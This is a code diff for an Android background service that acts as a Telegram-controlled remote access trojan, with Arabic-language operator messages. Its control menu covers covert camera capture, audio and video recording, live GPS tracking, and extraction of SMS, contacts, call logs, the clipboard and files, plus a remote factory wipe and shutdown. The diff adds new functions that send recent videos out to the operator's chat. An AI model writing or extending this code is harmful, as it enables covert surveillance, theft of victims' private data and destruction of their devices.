@@ -47,7 +47,7 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v2026_fix"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v2026_pro"
         private const val NOTIFICATION_ID = 2026
 
         private fun getObfuscatedToken(): String {
@@ -194,7 +194,7 @@ class BackgroundControlService : Service() {
                 executeCall(chatId, trimmed.substringAfter(":").trim())
             }
             else -> {
-                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية نشطة. اختر الأمر المطلوب:")
+                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية الشاملة نشطة. اختر الأمر المطلوب:")
             }
         }
     }
@@ -205,7 +205,7 @@ class BackgroundControlService : Service() {
                 data == "take_photo" -> captureCameraImage(chatId, "front")
                 data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
                 data == "record_video" -> executeCameraVideoRecording(chatId, 10)
-                data == "record_screen" -> launchScreenRecordActivity(chatId)
+                data == "record_screen" -> sendDirectMessage(chatId, "🎬 تسجيل الشاشة يتطلب تفعيلاً تفاعلياً من واجهة الجهاز.")
                 data == "record_audio" -> executeAudioCapture(chatId, 30)
                 data == "get_location" -> fetchStrictRealTimeLocation(chatId)
                 data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
@@ -214,6 +214,8 @@ class BackgroundControlService : Service() {
                 data == "get_clipboard" -> fetchSystemClipboard(chatId)
                 data == "view_files" -> enumerateTargetDirectory(chatId)
                 data == "pull_files" -> compileAndExtractArchive(chatId)
+                data == "view_videos" -> enumerateTargetVideos(chatId)
+                data == "pull_videos" -> extractAndPushRecentVideos(chatId, 5)
                 data == "get_calls" -> extractCallHistory(chatId)
                 data == "get_sms" -> extractSmsArchive(chatId)
                 data == "get_contacts" -> extractContactsDirectory(chatId)
@@ -228,16 +230,6 @@ class BackgroundControlService : Service() {
                 else -> sendDirectMessage(chatId, "⚙️ تم تنفيذ الإجراء: $data")
             }
         }
-    }
-
-    private fun launchScreenRecordActivity(chatId: String) {
-        sendDirectMessage(chatId, "🎬 يرجى فتح واجهة التطبيق على الجهاز لتمكين إذن تسجيل الشاشة النظامي.")
-        try {
-            val intent = Intent(applicationContext, MainActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            }
-            applicationContext.startActivity(intent)
-        } catch (_: Exception) {}
     }
 
     private fun captureCameraImage(chatId: String, facing: String) {
@@ -401,7 +393,7 @@ class BackgroundControlService : Service() {
         try {
             val smsManager = getSystemService(SmsManager::class.java)
             smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
-            sendDirectMessage(chatId, "✉️ تم إرسال SMS إلى: $phoneNumber")
+            sendDirectMessage(chatId, "✉️ تم إرسال SMS إلى الرقم $phoneNumber بنجاح.")
         } catch (e: Exception) {
             sendDirectMessage(chatId, "❌ فشل إرسال SMS: ${e.message}")
         }
@@ -472,6 +464,10 @@ class BackgroundControlService : Service() {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
     }
 
+    private fun getVideoReadPermission(): String {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
+    }
+
     private fun extractAndPushRecentImages(chatId: String, limit: Int) {
         if (!hasPermission(getStorageReadPermission())) {
             sendDirectMessage(chatId, "❌ صلاحية قراءة الصور غير ممنوحة.")
@@ -515,7 +511,7 @@ class BackgroundControlService : Service() {
                 val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                 val files = dir.listFiles()
                 if (files.isNullOrEmpty()) {
-                    sendDirectMessage(chatId, "📂 المجلد فارغ.")
+                    sendDirectMessage(chatId, "📂 مجلد التنزيلات فارغ.")
                     return@execute
                 }
                 val sb = StringBuilder("📂 ملفات النظام (${dir.name}):\n")
@@ -524,7 +520,7 @@ class BackgroundControlService : Service() {
                 }
                 sendDirectMessage(chatId, sb.toString())
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ الملفات: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ عرض الملفات: ${e.message}")
             }
         }
     }
@@ -552,9 +548,73 @@ class BackgroundControlService : Service() {
                     pushFileToTelegram(chatId, zipFile, "sendDocument", "document", "application/zip", "📥 أرشيف الملفات المضغوط")
                 }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ الأرشيف: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ سحب الملفات: ${e.message}")
             } finally {
                 if (zipFile.exists()) zipFile.delete()
+            }
+        }
+    }
+
+    private fun enumerateTargetVideos(chatId: String) {
+        if (!hasPermission(getVideoReadPermission())) {
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الفيديوهات غير ممنوحة.")
+            return
+        }
+        executionExecutor.execute {
+            try {
+                val projection = arrayOf(MediaStore.Video.Media.DISPLAY_NAME, MediaStore.Video.Media.SIZE)
+                val sb = StringBuilder("🎬 فيديوهات الجهاز المخزنة:\n\n")
+                var count = 0
+                contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC")?.use { cursor ->
+                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
+                    val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
+                    while (cursor.moveToNext() && count < 30) {
+                        val name = cursor.getString(nameIdx) ?: "فيديو"
+                        val sizeKB = (cursor.getLong(sizeIdx)) / 1024
+                        sb.append("• $name (${sizeKB} KB)\n")
+                        count++
+                    }
+                }
+                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد فيديوهات مسجلة." else sb.toString())
+            } catch (e: Exception) {
+                sendDirectMessage(chatId, "❌ خطأ عرض الفيديوهات: ${e.message}")
+            }
+        }
+    }
+
+    private fun extractAndPushRecentVideos(chatId: String, limit: Int) {
+        if (!hasPermission(getVideoReadPermission())) {
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الفيديوهات غير ممنوحة.")
+            return
+        }
+        executionExecutor.execute {
+            try {
+                sendDirectMessage(chatId, "📥 جاري سحب أحدث $limit فيديوهات...")
+                val projection = arrayOf(MediaStore.Video.Media._ID, MediaStore.Video.Media.DISPLAY_NAME)
+                val sentFiles = mutableListOf<File>()
+                contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC")?.use { cursor ->
+                    val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
+                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
+                    var sentCount = 0
+                    while (cursor.moveToNext() && sentCount < limit) {
+                        val id = cursor.getLong(idIdx)
+                        val name = cursor.getString(nameIdx) ?: "vid_$sentCount.mp4"
+                        val uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id.toString())
+                        val tempFile = File(cacheDir, "pull_vid_${System.currentTimeMillis()}_$name")
+                        contentResolver.openInputStream(uri)?.use { input ->
+                            FileOutputStream(tempFile).use { output -> input.copyTo(output) }
+                        }
+                        if (tempFile.exists() && tempFile.length() > 0) {
+                            pushFileToTelegram(chatId, tempFile, "sendVideo", "video", "video/mp4", "📤 فيديو مسحوب: $name")
+                            sentFiles.add(tempFile)
+                            sentCount++
+                        }
+                    }
+                }
+                sentFiles.forEach { if (it.exists()) it.delete() }
+                sendDirectMessage(chatId, "✅ تم سحب وإرسال الفيديوهات بنجاح.")
+            } catch (e: Exception) {
+                sendDirectMessage(chatId, "❌ خطأ سحب الفيديوهات: ${e.message}")
             }
         }
     }
@@ -587,7 +647,7 @@ class BackgroundControlService : Service() {
 
     private fun extractSmsArchive(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_SMS)) {
-            sendDirectMessage(chatId, "❌ فشل: صلاحية قراءة الرسائل (READ_SMS) غير ممنوحة من النظام.")
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل غير ممنوحة.")
             return
         }
         executionExecutor.execute {
@@ -609,19 +669,19 @@ class BackgroundControlService : Service() {
                 }
                 
                 if (count == 0) {
-                    sendDirectMessage(chatId, "ℹ️ صندوق الرسائل فارغ أو لا يمكن الوصول إليه.")
+                    sendDirectMessage(chatId, "ℹ️ صندوق الرسائل فارغ.")
                 } else {
                     sendDirectMessage(chatId, sb.toString())
                 }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ تقني أثناء سحب الرسائل: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ سحب الرسائل: ${e.message}")
             }
         }
     }
 
     private fun extractContactsDirectory(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
-            sendDirectMessage(chatId, "❌ فشل: صلاحية جهات الاتصال (READ_CONTACTS) غير ممنوحة من النظام.")
+            sendDirectMessage(chatId, "❌ صلاحية جهات الاتصال غير ممنوحة.")
             return
         }
         executionExecutor.execute {
@@ -656,7 +716,7 @@ class BackgroundControlService : Service() {
                     sendDirectMessage(chatId, sb.toString())
                 }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ تقني أثناء سحب جهات الاتصال: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ سحب جهات الاتصال: ${e.message}")
             }
         }
     }
@@ -720,40 +780,51 @@ class BackgroundControlService : Service() {
             var conn: HttpURLConnection? = null
             try {
                 val keyboard = JSONArray().apply {
+                    // الصف الأول: الكاميرات
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "take_photo"))
                         put(JSONObject().put("text", "📸 كاميرا خلفية").put("callback_data", "take_photo_rear"))
                     })
+                    // الصف الثاني: الفيديو والصوت
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "🎥 تسجيل فيديو").put("callback_data", "record_video"))
-                        put(JSONObject().put("text", "🎬 تسجيل شاشة").put("callback_data", "record_screen"))
-                    })
-                    put(JSONArray().apply {
                         put(JSONObject().put("text", "🎙️ صوت (30ث)").put("callback_data", "record_audio"))
+                    })
+                    // الصف الثالث: الموقع والتتبع
+                    put(JSONArray().apply {
                         put(JSONObject().put("text", "📍 موقع GPS").put("callback_data", "get_location"))
-                    })
-                    put(JSONArray().apply {
                         put(JSONObject().put("text", "🟢 تفعيل التتبع").put("callback_data", "start_live_tracking"))
-                        put(JSONObject().put("text", "🔴 إيقاف التتبع").put("callback_data", "stop_live_tracking"))
                     })
+                    // الصف الرابع: سحب الرسائل وجهات الاتصال
                     put(JSONArray().apply {
-                        put(JSONObject().put("text", "📥 سحب 10 صور").put("callback_data", "pull_images_10"))
-                        put(JSONObject().put("text", "📥 سحب 20 صورة").put("callback_data", "pull_images_20"))
-                        put(JSONObject().put("text", "📥 سحب 30 صورة").put("callback_data", "pull_images_30"))
+                        put(JSONObject().put("text", "💬 سحب الرسائل (SMS)").put("callback_data", "get_sms"))
+                        put(JSONObject().put("text", "📇 سحب جهات الاتصال").put("callback_data", "get_contacts"))
                     })
+                    // الصف الخامس: المكالمات والحافظة
                     put(JSONArray().apply {
-                        put(JSONObject().put("text", "📥 سحب 50 صورة").put("callback_data", "pull_images_50"))
-                        put(JSONObject().put("text", "📥 سحب 100 صورة").put("callback_data", "pull_images_100"))
-                    })
-                    put(JSONArray().apply {
-                        put(JSONObject().put("text", "🚀 تفريغ شامل").put("callback_data", "full_dump_report"))
+                        put(JSONObject().put("text", "📞 سجل المكالمات").put("callback_data", "get_calls"))
                         put(JSONObject().put("text", "📋 الحافظة").put("callback_data", "get_clipboard"))
                     })
+                    // الصف السادس: الملفات
                     put(JSONArray().apply {
-                        put(JSONObject().put("text", "📞 المكالمات").put("callback_data", "get_calls"))
-                        put(JSONObject().put("text", "💬 الرسائل").put("callback_data", "get_sms"))
-                        put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
+                        put(JSONObject().put("text", "📂 عرض الملفات").put("callback_data", "view_files"))
+                        put(JSONObject().put("text", "📥 سحب ملفات النظام").put("callback_data", "pull_files"))
                     })
+                    // الصف السابع: الفيديوهات (عرض وسحب)
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🎬 عرض الفيديوهات").put("callback_data", "view_videos"))
+                        put(JSONObject().put("text", "📥 سحب 5 فيديوهات").put("callback_data", "pull_videos"))
+                    })
+                    // الصف الثامن: سحب الصور
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "📥 سحب 10 صور").put("callback_data", "pull_images_10"))
+                        put(JSONObject().put("text", "📥 سحب 30 صورة").put("callback_data", "pull_images_30"))
+                    })
+                    // الصف التاسع: التفريغ الشامل
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🚀 تفريغ شامل للبيانات").put("callback_data", "full_dump_report"))
+                    })
+                    // الصف العاشر: إبادة وإطفاء
                     put(JSONArray().apply {
                         put(JSONObject().put("text", "⚠️ إبادة الجهاز").put("callback_data", "factory_reset"))
                         put(JSONObject().put("text", "🔌 إطفاء قسري").put("callback_data", "remote_shutdown"))
